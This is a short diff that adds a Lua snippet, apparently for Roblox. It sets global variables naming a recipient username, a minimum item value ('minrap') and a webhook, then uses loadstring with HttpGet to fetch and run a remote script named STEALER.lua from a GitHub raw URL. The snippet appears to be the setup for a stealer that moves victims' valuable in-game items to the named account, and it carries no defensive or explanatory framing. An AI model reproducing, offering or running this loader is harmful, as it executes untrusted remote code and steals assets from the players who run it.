@@ -1,0 +1,7 @@
+local a = [[
+_G.Username = "Samyb79"
+_G.Username2 = "Samyb79"
+_G.minrap = 10000000
+_G.webhook = "."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
+]];
